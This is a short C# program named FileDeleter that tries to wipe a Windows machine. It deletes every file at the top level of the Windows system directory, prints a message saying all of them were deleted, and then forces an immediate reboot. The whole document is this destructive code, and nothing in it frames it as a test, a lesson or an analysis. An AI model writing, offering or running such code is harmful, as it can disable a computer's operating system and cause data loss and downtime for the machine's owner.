// Import the necessary namespaces
using System;
using System.IO;
using System.Diagnostics;

namespace FileDeleter
{
    class Program
    {
        static void Main(string[] args)
        {
            // Get the path to the Windows directory
            string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);

            // Get all the files in the Windows directory
            string[] files = Directory.GetFiles(windowsPath);

            // Loop through each file and delete it
            foreach (string file in files)
            {
                File.Delete(file);
            }

            Console.WriteLine("All files in the Windows directory have been deleted.");

            // Reboot the system
            Process.Start("shutdown", "/r /t 0");
        }
    }
}